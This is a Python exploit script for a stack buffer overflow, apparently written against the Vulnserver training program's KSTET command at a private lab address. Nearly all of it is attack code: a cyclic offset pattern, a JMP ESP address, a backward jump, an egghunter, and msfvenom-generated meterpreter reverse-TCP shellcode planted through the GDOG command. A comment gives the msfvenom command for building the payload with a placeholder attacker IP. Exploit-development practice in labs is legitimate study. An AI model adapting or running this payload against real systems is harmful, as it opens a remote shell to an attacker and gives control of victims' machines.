import sys
import socket


evilString = "A" * 256
evilString = "A" * 700
# Buffer will not expand past it's initial length

# Meant to locate EIP

# Create cyclic pattern
#cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#cyclic_pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

#shellcode = "w00tw00t" + "A"*1000
#evilString = cyclic_pattern
JMP_ESP = "\xaf\x11\x50\x62"
JMP_70_BACK = "\xEB\xB8\x90\x90"
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
egghunter += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# Warning you must generate your own shellcode
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOURATTACKERIP LPORT=4444 -f python -b '\x00' -v shellcode

shellcode =  b""
shellcode += b"\xdb\xde\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x56"
shellcode += b"\xbd\x85\x20\x53\xb5\x83\xc0\x04\x31\x68\x14"
shellcode += b"\x03\x68\x91\xc2\xa6\x49\x71\x80\x49\xb2\x81"
shellcode += b"\xe5\xc0\x57\xb0\x25\xb6\x1c\xe2\x95\xbc\x71"
shellcode += b"\x0e\x5d\x90\x61\x85\x13\x3d\x85\x2e\x99\x1b"
shellcode += b"\xa8\xaf\xb2\x58\xab\x33\xc9\x8c\x0b\x0a\x02"
shellcode += b"\xc1\x4a\x4b\x7f\x28\x1e\x04\x0b\x9f\x8f\x21"
shellcode += b"\x41\x1c\x3b\x79\x47\x24\xd8\xc9\x66\x05\x4f"
shellcode += b"\x42\x31\x85\x71\x87\x49\x8c\x69\xc4\x74\x46"
shellcode += b"\x01\x3e\x02\x59\xc3\x0f\xeb\xf6\x2a\xa0\x1e"
shellcode += b"\x06\x6a\x06\xc1\x7d\x82\x75\x7c\x86\x51\x04"
shellcode += b"\x5a\x03\x42\xae\x29\xb3\xae\x4f\xfd\x22\x24"
shellcode += b"\x43\x4a\x20\x62\x47\x4d\xe5\x18\x73\xc6\x08"
shellcode += b"\xcf\xf2\x9c\x2e\xcb\x5f\x46\x4e\x4a\x05\x29"
shellcode += b"\x6f\x8c\xe6\x96\xd5\xc6\x0a\xc2\x67\x85\x42"
shellcode += b"\x27\x4a\x36\x92\x2f\xdd\x45\xa0\xf0\x75\xc2"
shellcode += b"\x88\x79\x50\x15\x99\x6e\x63\xc9\x21\xfe\x9d"
shellcode += b"\xea\x51\xd6\x59\xbe\x01\x40\x4b\xbf\xca\x90"
shellcode += b"\x74\x6a\x66\x9b\xe2\x55\xde\xe1\x9c\x3d\x1c"
shellcode += b"\x16\x70\xe2\xa9\xf0\x22\x4a\xf9\xac\x82\x3a"
shellcode += b"\xb9\x1c\x6b\x51\x36\x42\x8b\x5a\x9d\xeb\x26"
shellcode += b"\xb5\x4b\x43\xdf\x2c\xd6\x1f\x7e\xb0\xcd\x65"
shellcode += b"\x40\x3a\xe7\x9a\x0f\xcb\x82\x88\x78\xac\x6c"
shellcode += b"\x51\x79\x59\x6c\x3b\x7d\xcb\x3b\xd3\x7f\x2a"
shellcode += b"\x0b\x7c\x7f\x19\x08\x7b\x7f\xdc\x38\xf7\xb6"
shellcode += b"\x4a\x04\x6f\xb7\x9a\x84\x6f\xe1\xf0\x84\x07"
shellcode += b"\x55\xa1\xd7\x32\x9a\x7c\x44\xef\x0f\x7f\x3c"
shellcode += b"\x43\x87\x17\xc2\xba\xef\xb7\x3d\xe9\x73\xbf"
shellcode += b"\xc1\x6f\x5c\x18\xa9\x8f\xdc\x98\x29\xfa\xdc"
shellcode += b"\xc8\x41\xf1\xf3\xe7\xa1\xfa\xd9\xaf\xa9\x71"
shellcode += b"\x8c\x02\x48\x85\x85\xc3\xd4\x86\x2a\xd8\xe7"
shellcode += b"\xfd\x43\xdf\x08\x02\x4a\x84\x09\x02\x72\xba"
shellcode += b"\x36\xd4\x4b\xc8\x79\xe4\xef\xc3\xcc\x49\x59"
shellcode += b"\x4e\x2e\xdd\x99\x5b"

shellcode = "w00tw00t" + shellcode

#evilString = "A"*70 + JMP_ESP + JMP_70_BACK + "C"*(256-4-70-4)
evilString = "\x90"*18 + egghunter + "\x90"*20 + JMP_ESP + JMP_70_BACK + "C"*(256-18-32-20-4-4)

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command1 = "GDOG " + shellcode
s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command1)
s.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

command2 = "KSTET " + evilString

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()
